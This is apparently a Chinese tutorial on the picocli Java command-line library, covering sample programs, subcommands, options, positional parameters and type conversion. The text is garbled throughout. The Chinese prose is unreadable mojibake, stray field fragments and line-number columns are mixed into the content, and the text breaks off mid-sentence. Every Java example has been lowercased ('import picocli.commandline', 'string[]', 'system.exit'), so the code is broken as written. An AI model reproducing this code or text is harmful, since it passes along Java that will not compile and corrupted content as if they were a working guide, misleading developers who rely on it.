Javaå½ä»¤è¡åºç¨ç¨åºèªå¨å®ææåï¼äºè§£å¦ä½çæä¸ºæ¨çåºç¨ç¨åºéèº«å®å¶çèªå¨å®æèæ¬ã\n\n\n# æ´å¤\n\nä¸ºäºä¿ææ¬å¿«éæåç®ç­ï¼æè³å°ç®ç­ï¼ï¼å¿é¡»éæ¼ä¸äºä¸è¥¿ãå¦ææ¨æå´è¶£ï¼è¿éæä¸äºå¿«éé¾æ¥ï¼\n\n * Picocli in Other Languages\n * Usage Help API for customizing the usage help message layout\n * Tips & Tricks\n * API Javadoc',normalizedContent:'# picocli\n\n> æè¿çªåå¥æ³å°è¯ç¨javaåä¸åå®å¨å°å·¥å·ãä¸è¿ä¸äºå¼å¤´é¾ï¼å¦ä½å¨å½ä»¤è¡ä¸æå°å¸®å©ææ¡£ç«ç¶ä¸ç´å°æ°çæãå½ç¶ï¼è¿ä¸ªå®ç°èµ·æ¥å¶å®ä¸é¾ï¼ä½æ¯åèµ·æ¥æ··ä¹±ä¸ä¸ç¾è§ã\n> \n> åå¼å§çæ¶åï¼ä¸ºäºæå°åºå½©è²çå­ç¬¦ï¼æå°è¯ä½¿ç¨\\033[è¿ç§è½¬ä¹å­ç¬¦ï¼å¹¶åäºä¸ä¸ªå·¥å·ç±»ï¼ç¨äºçææå®æ ¼å¼åé¢è²çæå°å­ç¬¦ä¸²ãå¶å®ï¼éå¯¹äºå½ä»¤è¡æ©æå¶ä»çè§£å³æ¹æ¡ï¼ä¸ä½¿ç¨èµ·æ¥æ¯è¾é¡ºæåè§èï¼æå·®ç¹æ³èªå·±åä¸ä¸ªââä½å¿éå¤é è½®å­å¢ï¼ï¼è¯¸å¦apache commons cliç­ãå¨å°è¯ä½¿ç¨commons cliæ¶ï¼æåç°å®ç¡®å®å¥½ç¨ï¼ä½æ¯ä¼¼ä¹æ»¡è¶³ä¸äºå½©è²æå°çéæ±ãäºæ¯æå¼å§å¯»æ¾å¶ä»çè§£å³æ¹æ¡ï¼æç»åç°äºpicocliã\n\nå¿«éå¥é¨ææ¡£å°åï¼https://picocli.info/quick-guide.html\n\nå®æ´ææ¡£å°åï¼https://picocli.info\n\ngithubå°åï¼https://github.com/remkop/picocli\n\n\n# ç®ä»\n\n> picocliä½¿ç¨æ¥è¿é¶ä»£ç çæ¹å¼å¨ä¸ä¸ªæä»¶ä¸­å®æjava cliç¨åºçåå»ºï¼picocliçç®æ æ¯åå»ºä¸ä¸ªå¯ä»¥å¨jvmè¿è¡æèè±ç¦»jvmçè¯·æå½ä»¤è¡åºç¨ã\n\npicocliæ¯æè¯¸å¦ï¼posixãgnuãms-dosç­å¤ç§å½ä»¤è¡è¯­æ³æ ·å¼ï¼å¹¶ä¸å¯ä»¥ansié¢è²åæ ·å¼çæé«åº¦å®å¶åçå¸®å©ä¿¡æ¯ãåºäºpicocliåå»ºçå½ä»¤è¡ç¨åºæ¯æä»»ä½å±çº§ä¸çå½ä»¤åæ°æç¤ºåè¡¥å¨ãåºäºpicocliçåºç¨ç¨åºå¯ä»¥æåç¼è¯ä¸ºgraalvmæ¬æºæ åï¼å¯å¨æ¶é´æå¿«ï¼åå­è¦æ±æ´ä½ï¼å¯ä»¥ä½ä¸ºåä¸ªå¯æ§è¡æä»¶ååãpicocliè¿å¯ä»¥ä¸ºæ¨çåºç¨ç¨åºçæç²¾ç¾çææ¡£ï¼æ ¼å¼åæ¬htmlãpdfåunixæåé¡µã\n\nä½¿ç¨å¸®å©çä¾å­ï¼\n\n\n\n> æ¬æä½¿ç¨picocliçæ³¨è§£apiãå¯¹äºæ æ³ä½¿ç¨æ³¨è§£çåºç¨ç¨åºï¼è¿æä¸ä¸ªç¼ç¨apiï¼ç¨äºå®ä¹é¢æçéé¡¹åä½ç½®åæ°ï¼å¹¶å¤çè§£æç»æãæ¬å¿«éæåä¸æ¶µçç¼ç¨apiã\n\n\n# å¥é¨æ¡ä¾\n\nä¸é¢ä»¥ä¸ä¸ªå°åä½åè½é½å¨çåºäºpicocliçå½ä»¤è¡åºç¨ç¨åºasciiartä½ä¸ºç¤ºä¾ä»£ç ã\n\nasciiartå°ä¸ä¸ªæå¤ä¸ªåæ°è½¬æ¢ä¸ºasciiå­ç¬¦ç»ï¼å¹¶å°å¶æå°åºæ¥ãä½¿ç¨æ¹æ³å¦ä¸ï¼\n\n$ java -cp "myapp.jar;picocli-4.6.3.jar" asciiart --font-size=9 hello picocli\n       #   #       #  #                 #                  #  #\n       #   #       #  #                                    #\n       #   #  ***  #  #  ****     #***  #  **#  ****  **#  #  #\n       #####  ***  #  #  ****     #***  #  **   ****  **   #  #\n       #   #  *#*  #  #  *  *     #  *  #  *    *  *  *    #  #\n       #   #  **   #  #  ****     #***  #  **   ****  **   #  #\n       #   #  **#  #  #  ****     #***  #  **#  ****  **#  #  #\n                                  #\n                                  *\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\nå¦æä½ æ³ç´æ¥ä»¥ä»¥ä¸çæ¹å¼è¿è¡ï¼å¯ä»¥æ¥çåºç¨æåçç¸å³ææ¡£ã\n\nasciiart --font-size=9 hello picocli\n\n\n1\n\n\n\n# asciiart æºç è§£è¯»\n\nasciiartçä»£ç ç¼©ç­å¦ä¸ï¼\n\n/**\n * ascii art: basic picocli based sample application\n * explanation: <a href="https://picocli.info/quick-guide.html#_basic_example_asciiart">picocli quick guide</a>\n * source code: <a href="https://github.com/remkop/picocli/blob/master/picocli-examples/src/main/java/picocli/examples/i18n/i18ndemo.java">github</a> \n * @author andreas deininger\n */\nimport picocli.commandline;\nimport picocli.commandline.command;\nimport picocli.commandline.option;\nimport picocli.commandline.parameters;\n\nimport java.awt.font;\nimport java.awt.graphics;\nimport java.awt.graphics2d;\nimport java.awt.renderinghints;\nimport java.awt.image.bufferedimage;\n\n@command(name = "asciiart", version = "asciiart 1.0", mixinstandardhelpoptions = true) // |1|\npublic class asciiart implements runnable { // |2|\n\n    @option(names = { "-s", "--font-size" }, description = "font size") // |3|\n    int fontsize = 14;\n\n    @parameters(paramlabel = "<word>", defaultvalue = "hello, picocli",  // |4|\n               description = "words to be translated into ascii art.")\n    private string[] words = { "hello,", "picocli" }; // |5|\n\n    @override\n    public void run() { // |6|\n        // https://stackoverflow.com/questions/7098972/ascii-art-java\n        bufferedimage image = new bufferedimage(144, 32, bufferedimage.type_int_rgb);\n        graphics graphics = image.getgraphics();\n        graphics.setfont(new font("dialog", font.plain, fontsize));\n        graphics2d graphics2d = (graphics2d) graphics;\n        graphics2d.setrenderinghint(renderinghints.key_text_antialiasing,\n                renderinghints.value_text_antialias_on);\n        graphics2d.drawstring(string.join(" ", words), 6, 24);\n\n        for (int y = 0; y < 32; y++) {\n            stringbuilder builder = new stringbuilder();\n            for (int x = 0; x < 144; x++)\n                builder.append(image.getrgb(x, y) == -16777216 ? " " : image.getrgb(x, y) == -1 ? "#" : "*");\n            if (builder.tostring().trim().isempty()) continue;\n            system.out.println(builder);\n        }\n    }\n\n    public static void main(string[] args) {\n        int exitcode = new commandline(new asciiart()).execute(args); // |7|\n        system.exit(exitcode); // |8|\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n\n\næä»¬å¯ä»¥æä¸é¢çä»£ç æåæ¥çï¼\n\n 1. åå»ºä¸ä¸ªç±»ç»§æ¿runableæècallableã\n 2. ä½¿ç¨@commandæ³¨è§£æ æ³¨è¿ä¸ªç±»ï¼å¹¶è®¾ç½®ä¸ä¸ªåå­ï¼mixinstandardhelpoptionséé¡¹ç¨äºçæä¸ä¸ªå¸®å©åçæ¬ææ¡£ï¼ä½¿ç¨åæ°--helpå--versionï¼ã\n 3. ç»æ¯ä¸ä¸ªå½ä»¤éé¡¹å¯¹åºçæååéæ·»å ä¸ä¸ª@optionæ³¨è§£ï¼å¦ä¸æç¤ºï¼ä½ å¯ä»¥å®ä¹ä¸ä¸ªéé¡¹çåç§°åæ³¨éãå½ç¶ï¼è¿æä¸äºå¶ä»çéé¡¹ã\n 4. ç»æ¯ä¸ä¸ªå¯è½çåæ°æ·»å ä¸ä¸ª@parametersæ³¨è§£ï¼picocliå°æå½ä»¤è¡åæ°è½¬æ¢ä¸ºå¼ºç±»åå¼ï¼å¹¶å°è¿äºå¼æ³¨å¥è¢«æ³¨è§£çå­æ®µã\n 5. å¨ç±»çrunæcallæ¹æ³ä¸­å®ä¹æ¨çä¸å¡é»è¾ãè§£ææåå®æåè°ç¨æ­¤æ¹æ³ã\n 6. å¨ç±»çmainæ¹æ³ä¸­ï¼ä½¿ç¨commandline.executeæ¹æ³å¼å¯¼åºç¨ç¨åºãè¿å°è§£æå½ä»¤è¡ï¼å¤çéè¯¯ï¼å¤çä½¿ç¨è¯·æ±åçæ¬å¸®å©ï¼å¹¶è°ç¨ä¸å¡é»è¾ã\n 7. commandline.executeæ¹æ³è¿åä¸ä¸ªéåºä»£ç ãæ¨çåºç¨ç¨åºå¯ä»¥ä½¿ç¨æ­¤éåºä»£ç è°ç¨system.exitï¼ä»¥è¡¨ç¤ºè°ç¨è¿ç¨çæåæå¤±è´¥ã\n\nè¿æ¯å ä¹ä»»ä½picocliåºç¨çåºæ¬æ¡æ¶ã\n\n> æå³æ´å¤ä½¿ç¨å¸®å©ï¼è¯·åéåèæåï¼ä¾å¦ç»æ¹æ³æ·»å ä¸ä¸ªæ³¨è§£ã\n\nåä»»ä½ä¸ä¸çå½ä»¤è¡åºç¨ç¨åºä¸æ ·ï¼asciiartæ--helpå--versionéé¡¹ã--helpéé¡¹åç¨æ·å±ç¤ºäºå¦ä½ä½¿ç¨åºç¨ç¨åºãpicocliä¼èªå¨çææ­¤ä½¿ç¨å¸®å©æ¶æ¯ï¼\n\n$ asciiart --help\nusage: asciiart [-hv] [-s=<fontsize>] [<word>...]\n      [<word>...]             words to be translated into ascii art.\n  -s, --font-size=<fontsize>  font size\n  -h, --help                  show this help message and exit.\n  -v, --version               print version information and exit.\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# è¿è¡ç¨åº\n\næ·»å picocliä¾èµã\n\n<dependencies>\n  <dependency>\n    <groupid>info.picocli</groupid>\n    <artifactid>picocli</artifactid>\n    <version>4.6.3</version>\n  </dependency>\n</dependencies>\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\nè®¾ç½®è¿è¡åæ°ä¸º-hå¹¶è¿è¡ã\n\n\n\n\n# å­å½ä»¤æ¡ä¾\n\nä¸é¢æä»¬å±ç¤ºäºå¦ä¸ä¸ªå°åä½åè½é½å¨çåºäºpicocliçå½ä»¤è¡åºç¨ç¨åºç¤ºä¾ï¼è¯¥åºç¨ç¨åºè§£éäºå­å½ä»¤çä½¿ç¨ï¼isocoderesolverã\n\nè¯¥åºç¨ç¨åºæä¸¤ä¸ªå­å½ä»¤ï¼è¯­è¨åå½å®¶ï¼æ ¹æ®isoæ åè§£æè¯­è¨æå½å®¶ä»£ç ï¼å½å®¶ä»£ç ä¸ºiso-3166-1ï¼è¯­è¨ä»£ç ä¸ºiso-639-1/639-2ï¼ãè¯¥åºç¨ç¨åºå¯ä»¥æä»¥ä¸æ¹å¼ä½¿ç¨ï¼\n\n$ java -cp "myapp.jar;picocli-4.6.3.jar" isocoderesolver language de cs en sd se\nde: german\ncs: czech\nen: english\nsd: sindhi\nse: northern sami\n\n\n1\n2\n3\n4\n5\n6\n\n\næèï¼\n\n$ java -cp "myapp.jar;picocli-4.6.3.jar" isocoderesolver country cn fr th ro no\ncn: china\nfr: france\nth: thailand\nro: romania\nno: norway\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# æºç è§£è¯»\n\næºä»£ç å¦ä¸æç¤ºï¼\n\n/*\n * iso code resolver: picocli based sample application (with subcommands)\n * explanation: <a href="https://picocli.info/quick-guide.html#_subcommands_example_iso_code_resolver">picocli quick guide</a>\n * source code: <a href="https://github.com/remkop/picocli/blob/master/picocli-examples/src/main/java/picocli/examples/subcommands/subcommanddemo.java">github</a> \n * @author andreas deininger\n */\nimport picocli.commandline;\nimport picocli.commandline.command;\nimport picocli.commandline.model.commandspec;\nimport picocli.commandline.parameters;\nimport picocli.commandline.parameterexception;\nimport picocli.commandline.spec;\nimport java.util.locale;\n\n@command(name = "isocoderesolver", subcommands = { subcommandasclass.class, commandline.helpcommand.class }, // |2|\n         description = "resolve iso country codes (iso-3166-1) or language codes (iso 639-1 or -2)")\npublic class isocoderesolver implements runnable { // |1|\n  @spec commandspec spec;\n\n  @command(name = "country", description = "resolve iso country code (iso-3166-1, alpha-2 code)") // |3|\n  void subcommandviamethod(@parameters(arity = "1..*", paramlabel = "<country code>",\n                                       description = "country code(s) to be resolved") string[] countrycodes) {\n    for (string code : countrycodes) {\n      system.out.println(string.format("%s: %s", code.touppercase(), new locale("", code).getdisplaycountry()));\n    }\n  }\n\n  @override\n  public void run() {\n    throw new parameterexception(spec.commandline(), "specify a subcommand");\n  }\n\n  public static void main(string[] args) {\n    int exitcode = new commandline(new isocoderesolver()).execute(args); // |5|\n    system.exit(exitcode); // |6|\n  }\n}\n\n@command(name = "language", description = "resolve iso language code (iso 639-1 or -2, two/three letters)") // |4|\nclass subcommandasclass implements runnable {\n\n  @parameters(arity = "1..*", paramlabel = "<language code>", description = "language code(s) to be resolved")\n  private string[] languagecodes;\n\n  @override\n  public void run() {\n    for (string code : languagecodes) {\n      system.out.println(string.format("%s: %s", code.tolowercase(), new locale(code).getdisplaylanguage()));\n    }\n  }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n\n 1. å½é¡¶çº§å½ä»¤æ²¡æå®ç°runnableæcallableæ¶ï¼ç¨æ·å¿é¡»æå®ä¸ä¸ªå­å½ä»¤ï¼å­å½ä»¤æä¸ºå¿å¡«é¡¹ï¼ãè¿æ¯å¯éçï¼å¦æç¶å½ä»¤å¯ä»¥å¨åºç¨ç¨åºä¸­æ éå­å½ä»¤çæåµä¸èªè¡æ§è¡ï¼åªéå®ç°runnableæcallableå³å¯ã\n 2. ä½¿ç¨@commandæ æ³¨è¿ä¸ªç±»ï¼åæ¶éè¦æ³¨æçæ¯æä»¬ä½¿ç¨commandline.helpcommand.classä½ä¸ºå­ç±»ï¼çæhelpå­å½ä»¤ã\n 3. å¯ä»¥éè¿ä¸¤ç§æ¹å¼å°èªå®ä¹å­å½ä»¤æ·»å å°é¡¶çº§å½ä»¤ä¸­ãæç®åçæ¹æ³æ¯åç±»ä¸­çæ¹æ³æ·»å @commandæ³¨è§£ãå¯¹äºå­å½ä»¤çæ¯ä¸ªéé¡¹åä½ç½®åæ°ï¼æ·»å ä¸ä¸ªæ¹æ³åæ°ï¼å¹¶ä½¿ç¨@optionæ@parametersæ³¨éå¯¹è¿äºæ¹æ³åæ°è¿è¡æ³¨éãå¨ä¸é¢çç¤ºä¾ä¸­ï¼ä¸æ¦ç¨æ·è°ç¨å­å½ä»¤contaryï¼å³èæ¹æ³subcommandviamethodå°±ä¼è¢«è°ç¨ã\n 4. å¨è¾å¤§çåºç¨ç¨åºä¸­ï¼éå¸¸ä¸ºæ¯ä¸ªå­å½ä»¤åå»ºä¸ä¸ªåç¬ç@commandæ³¨éçç±»ãå¨ä¸é¢çç¤ºä¾ä¸­ï¼subcommandasclassç±»è¡¨ç¤ºlanguageå­å½ä»¤ãä¸æ¦ç¨æ·è°ç¨æ­¤å­å½ä»¤ï¼å°è°ç¨è¯¥ç±»çéåçrunæ¹æ³ãè¦æ³¨åå­å½ä»¤ï¼è¯·å¨ç¶å½ä»¤ç@commandæ³¨éçå­å½ä»¤å±æ§ä¸­æå®å­å½ä»¤ç±»ï¼subcommands = { subcommandasclass.class, ... }ï¼ã\n 5. å¨ç±»çmainæ¹æ³ä¸­ï¼ä½¿ç¨commandline.executeæ¹æ³å¼å¯¼åºç¨ç¨åºãè¿å°è§£æå½ä»¤è¡ï¼å¤çéè¯¯ï¼å¤çä½¿ç¨è¯·æ±åçæ¬å¸®å©ï¼å¹¶è°ç¨ä¸å¡é»è¾ã\n 6. commandline.executeæ¹æ³è¿åä¸ä¸ªéåºä»£ç ãæ¨çåºç¨ç¨åºå¯ä»¥ä½¿ç¨æ­¤éåºä»£ç è°ç¨system.exitï¼ä»¥è¡¨ç¤ºè°ç¨è¿ç¨çæåæå¤±è´¥ã\n\n> æå³å­å½ä»¤çæ´å¤è¯¦ç»ä¿¡æ¯åæ¹é¢ï¼è¯·åéåèæåçå­å½ä»¤ä¸ç« ã\n\né¤äºä¸¤ä¸ªç¨æ·å®ä¹çå­å½ä»¤å¤ï¼isocoderesolveråºç¨ç¨åºè¿æä¾äºä¸ä¸ªå¸®å©å­å½ä»¤ï¼è¯¥å­å½ä»¤å°ä½¿ç¨å¸®å©æ¶æ¯æå°å°æ§å¶å°ãpicocliä¼èªå¨çææ­¤ä½¿ç¨å¸®å©æ¶æ¯ï¼\n\n$ isocoderesolver help\nusage: isocoderesolver [command]\nresolves iso country codes (iso-3166-1) or language codes (iso-639-1/-2)\ncommands:\n  help      displays help information about the specified command\n  country   resolves iso country codes (iso-3166-1)\n  language  resolves one or more iso language codes (iso-639-1 or 639-2)\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# æ§è¡åæ¹åä»¥ä¸çä»£ç \n\nå®å¨ä½¿ç¨æ¹æ³å®ç°ï¼æ¹åå¦ä¸ï¼\n\npackage com.pwddd.picocli;/*\n * iso code resolver: picocli based sample application (with subcommands)\n * explanation: <a href="https://picocli.info/quick-guide.html#_subcommands_example_iso_code_resolver">picocli quick guide</a>\n * source code: <a href="https://github.com/remkop/picocli/blob/master/picocli-examples/src/main/java/picocli/examples/subcommands/subcommanddemo.java">github</a>\n * @author andreas deininger\n */\nimport picocli.commandline;\nimport picocli.commandline.command;\nimport picocli.commandline.model.commandspec;\nimport picocli.commandline.parameters;\nimport picocli.commandline.parameterexception;\nimport picocli.commandline.spec;\nimport java.util.locale;\n\n@command(name = "isocoderesolver", subcommands = { commandline.helpcommand.class }, // |2|\n         description = "resolve iso country codes (iso-3166-1) or language codes (iso 639-1 or -2)")\npublic class isocoderesolver  { // |1|\n  @spec commandspec spec;\n\n  @command(name = "country", description = "resolve iso country code (iso-3166-1, alpha-2 code)") // |3|\n  void subcommandviamethod(@parameters(arity = "1..*", paramlabel = "<country code>",\n                                       description = "country code(s) to be resolved") string[] countrycodes) {\n    for (string code : countrycodes) {\n      system.out.println(string.format("%s: %s", code.touppercase(), new locale("", code).getdisplaycountry()));\n    }\n  }\n\n  @command(name = "language",description = "resolve iso language code (iso 639-1 or -2, two/three letters)")\n  void subcommandviamethodlanguage(@parameters(arity = "1..*",\n          paramlabel = "<language code>",\n          description = "language code(s) to be resolved") string[] languagecodes){\n    for (string code : languagecodes) {\n      system.out.println(string.format("%s: %s", code.tolowercase(), new locale(code).getdisplaylanguage()));\n    }\n  }\n\n  public static void main(string[] args) {\n    int exitcode = new commandline(new isocoderesolver()).execute(args); // |5|\n    system.exit(exitcode); // |6|\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n\n\nå®å¨ä½¿ç¨ç±»å®ç°ï¼æ¹åå¦ä¸ï¼\n\npackage com.pwddd.picocli;/*\n * iso code resolver: picocli based sample application (with subcommands)\n * explanation: <a href="https://picocli.info/quick-guide.html#_subcommands_example_iso_code_resolver">picocli quick guide</a>\n * source code: <a href="https://github.com/remkop/picocli/blob/master/picocli-examples/src/main/java/picocli/examples/subcommands/subcommanddemo.java">github</a>\n * @author andreas deininger\n */\nimport picocli.commandline;\nimport picocli.commandline.command;\nimport picocli.commandline.model.commandspec;\nimport picocli.commandline.parameters;\nimport picocli.commandline.parameterexception;\nimport picocli.commandline.spec;\nimport java.util.locale;\n\n@command(name = "isocoderesolver", subcommands = { commandline.helpcommand.class,languagecommand.class,countrycommand.class }, // |2|\n         description = "resolve iso country codes (iso-3166-1) or language codes (iso 639-1 or -2)")\npublic class isocoderesolver  { // |1|\n\n  public static void main(string[] args) {\n    int exitcode = new commandline(new isocoderesolver()).execute(args); // |5|\n    system.exit(exitcode); // |6|\n  }\n}\n\n@command(name = "language",description = "resolve iso language code (iso 639-1 or -2, two/three letters)")\nclass languagecommand implements runnable{\n\n  @parameters(arity = "1..*", paramlabel = "<language code>", description = "language code(s) to be resolved")\n  private string[] languagecodes;\n\n  @override\n  public void run() {\n    for (string code : languagecodes) {\n      system.out.println(string.format("%s: %s", code.tolowercase(), new locale(code).getdisplaylanguage()));\n    }\n  }\n}\n\n@command(name = "country",description = "resolve iso country code (iso-3166-1, alpha-2 code)")\nclass countrycommand implements runnable{\n\n  @parameters(arity = "1..*", paramlabel = "<country code>", description = "country code(s) to be resolved")\n  private string[] countrycodes;\n\n  @override\n  public void run() {\n    for (string code : countrycodes) {\n      system.out.println(string.format("%s: %s", code.touppercase(), new locale("", code).getdisplaycountry()));\n    }\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n\n\n\n# éé¡¹ååæ°\n\nå½ä»¤è¡åæ°å¯ä»¥åä¸ºéé¡¹åä½ç½®åæ°ãéé¡¹æä¸ä¸ªåç§°ï¼ä½ç½®åæ°éå¸¸æ¯éé¡¹åé¢çå¼ï¼ä½å®ä»¬å¯è½æ¯æ··åçã\n\n\n\npicocliå¯¹éé¡¹åä½ç½®åæ°æåç¬çæ³¨è§£ã\n\n\n# éé¡¹æ³¨è§£\n\n# æ®ééé¡¹\n\néé¡¹å¿é¡»æä¸ä¸ªæå¤ä¸ªåç§°ãéé¡¹åç§°éå¸¸ä»¥-æ--å¼å¤´ï¼ä½picocliåè®¸æ¨ä½¿ç¨æ¨æ³è¦çä»»ä½éé¡¹åç§°ã\n\nä¸é¢çç¤ºä¾æ¾ç¤ºäºå·æä¸ä¸ªæå¤ä¸ªåç§°çéé¡¹ãä½¿ç¨éé¡¹åæ°çéé¡¹åå¸®å©éé¡¹ã\n\nclass tar {\n  @option(names = "-c", description = "create a new archive")\n  boolean create;\n\n  @option(names = { "-f", "--file" }, paramlabel = "archive", description = "the archive file")\n  file archive;\n\n  @parameters(paramlabel = "file", description = "one or more files to archive")\n  file[] files;\n\n  @option(names = { "-h", "--help" }, usagehelp = true, description = "display a help message")\n  private boolean helprequested;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\npicocliå¹ééé¡¹åç§°æ¥è®¾ç½®å­æ®µå¼ã\n\npicocliæ¯æposixéç¾¤ç­éé¡¹ï¼ä¸ä¸ªæå¤ä¸ªæ²¡æéé¡¹åæ°çåä¸ªå­ç¬¦éé¡¹ï¼å¶æ¬¡æ¯æå¤ä¸ä¸ªå¸¦æéé¡¹åæ°çéé¡¹ï¼å¯ä»¥åç»å¨ä¸ä¸ªâ-âç ´æå·åé¢ã\n\nstring[] args = { "-c", "--file", "result.tar", "file1.txt", "file2.txt" };\ntar tar = new tar();\nnew commandline(tar).parseargs(args);\n\nassert !tar.helprequested;\nassert  tar.create;\nassert  tar.archive.equals(new file("result.tar"));\nassert  arrays.equals(tar.files, new file[] {new file("file1.txt"), new file("file2.txt")});\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\nä¾å¦ï¼å¯¹äºä¸é¢çtarç¤ºä¾ï¼ä»¥ä¸å½ä»¤è¡è°ç¨æ¯ç­ä»·çï¼\n\ntar -c -f result.tar f1.txt f2.txt\ntar -cf result.tar f1.txt f2.txt\ntar -cfresult.tar f1.txt f2.txt\n\n\n1\n2\n3\n\n\n# äº¤äºå¼å¯ç éé¡¹\n\nå¯¹äºæ è®°ä¸ºäº¤äºå¼çéé¡¹åä½ç½®åæ°ï¼ç³»ç»ä¼æç¤ºç¨æ·å¨æ§å¶å°ä¸è¾å¥å¼ãå¨java 6ææ´é«çæ¬ä¸è¿è¡æ¶ï¼picocliå°ä½¿ç¨console.readpassword apiï¼ä»¥ä¾¿ç¨æ·è¾å¥ä¸ä¼ååºå°æ§å¶å°ã\n\n\n# åæ°æ³¨è§£\n\nä»»ä½ä¸æ¯å­å½ä»¤ãéé¡¹æéé¡¹åæ°çå½ä»¤è¡åæ°é½ä¼è¢«è§£éä¸ºä½ç½®åæ°ãä½¿ç¨ï¼åºäºé¶çï¼ç´¢å¼å±æ§æ¥åç¡®æå®è¦æè·çåæ°ãçç¥ç´¢å¼å±æ§æå³çå­æ®µæè·ææä½ç½®åæ°ãæ°ç»æéåå­æ®µå¯ä»¥æè·å¤ä¸ªå¼ãç´¢å¼å±æ§æ¥åèå´å¼ï¼å æ­¤å@parametersï¼index = "2.4")è¿æ ·çæ³¨éæè·ç´¢å¼2ã3å4çåæ°ãèå´å¼å¯ä»¥æ¯å¼æ¾å¼çãä¾å¦ï¼@parametersï¼index = "3..*")æè·ç´¢å¼3åä»¥ä¸çææåæ°ã\n\nclass positionaldemo {\n    @parameters(index = "0")    inetaddress host;\n    @parameters(index = "1")    int port;\n    @parameters(index = "2..*") list<file> files;\n}\n\n\n1\n2\n3\n4\n5\n\n\npicocliä½¿ç¨åæ°æ°ç»ä¸­æå®ç´¢å¼å¤çå¼åå§åå­æ®µã\n\nstring[] args = { "localhost", "12345", "file1.txt", "file2.txt" };\npositionaldemo params = commandline.populatecommand(new positionaldemo(), args);\n\nassert params.host.gethostname().equals("localhost");\nassert params.port == 12345;\nassert params.files.equals(arrays.aslist(new file("file1.txt"), new file("file2.txt")));\n\n\n1\n2\n3\n4\n5\n6\n\n\nç¨æ·æåææ´å¤å³äºéé¡¹åä½ç½®åæ°çè¯¦ç»ä¿¡æ¯ï¼ä»¥å--éé¡¹ç»æåéç¬¦ååæ°æä»¶ï¼@-filesï¼ã\n\n\n# å¼ºç±»åè½¬æ¢\n\nå½å½ä»¤è¡éé¡¹åä½ç½®åæ°æ å°å°æ³¨è§£çå­æ®µæ¶ï¼ææ¬å¼å°è½¬æ¢ä¸ºæ³¨è§£çå­æ®µçç±»åã\n\n\n# ç±»åè½¬æ¢\n\nå¼ç®±å³ç¨ï¼picocliå¯ä»¥å°å½ä»¤è¡åæ°å­ç¬¦ä¸²è½¬æ¢ä¸ºè®¸å¤å¸¸è§æ°æ®ç±»åãæå³åç½®ç±»åçå®æ´åè¡¨ï¼è¯·åéç¨æ·æåï¼ä½ä¸è¬æ¥è¯´ï¼ææåå§ç±»ååå¶å¯¹è±¡ç­ä»·ç©ï¼ä»»ä½æä¸¾ä»¥åæä»¶ãæ¥æãurlãbigdecimalãæ­£åè¡¨è¾¾å¼æ¨¡å¼ç­å¸¸è§ç±»é½å¯ä»¥æåæ ·ä½¿ç¨ãå¨java 7ä¸è¿è¡çåºç¨ç¨åºå¯ä»¥ä½¿ç¨pathï¼å¨java 8ä¸å¯ä»¥ä½¿ç¨æ°çjava.timeç±»ã\n\næ¨è¿å¯ä»¥ä½¿ç¨èªå®ä¹ç±»åè½¬æ¢å¨æ¥å¤çä¸è¿°åç½®æ°æ®ç±»åä»¥å¤çæ°æ®ç±»åã\n\n\n# éååå­å¸\n\nå¦æéé¡¹æä½ç½®åæ°å¯ä»¥å·æå¤ä¸ªå¼ï¼åå­æ®µç±»åå¿é¡»æ¯æ°ç»ãéåææ å°ãå¯ä»¥ä½¿ç¨listãsetæqueueç­ä»»ä½éåå­ç±»ã\n\nä¸ä¸ªå¸¸è§çè¦æ±æ¯å·æç±»ä¼¼äºjavaç³»ç»å±æ§çé®å¼å¯¹çéé¡¹ï¼ä¾å¦-dkey=valueãè¦å®ç°è¿ä¸ç¹ï¼æ¨åªéä½¿ç¨mapå­æ®µå³å¯ã\n\nåªè¦ä¸ºé®åå¼ç±»åé½æ³¨åäºç±»åè½¬æ¢å¨ï¼æ å°å­æ®µçé®åå¼å¯è½å·æä»»ä½ç±»åãé®åå¼ç±»åä»mapçéç¨ç±»ååæ°ä¸­æ¨æ­åºæ¥ãä¾å¦ï¼\n\nclass mapdemo {\n    @option(names = {"-u", "--timeunit"});\n    map<java.util.concurrent.timeunit, long> timeout;\n}\n\n\n1\n2\n3\n4\n\n\nä»¥ä¸å½ä»¤è¡å°çæmapä¸­çåä¸ªé®å¼æ¡ç®ï¼\n\n<command> -udays=3 -u hours=23 -u=minutes=59 --timeunit=seconds=13\n\n\n1\n\n\n\n# å¿éåæ°\n\n\n# å¿ééé¡¹\n\nå¯ä»¥æ è®°æéçéé¡¹ï¼ä½¿ç¨æ·å¿é¡»å¨å½ä»¤è¡ä¸æå®å®ä»¬ãå½æªæå®æéçéé¡¹æ¶ï¼å°ä»è§£ææ¹æ³ä¸­æåºmissingparameterexceptionãä¾å¦ï¼\n\n@option(names = "-n", required = true, description = "mandatory number")\nint number;\n\n\n1\n2\n\n\n\n# å¿éåæ°\n\nä½¿ç¨arityè®©@parameteråæ°å¼ºå¶ä½¿ç¨ï¼\n\n@parameters(arity = "1..*", descriptions = "at least one 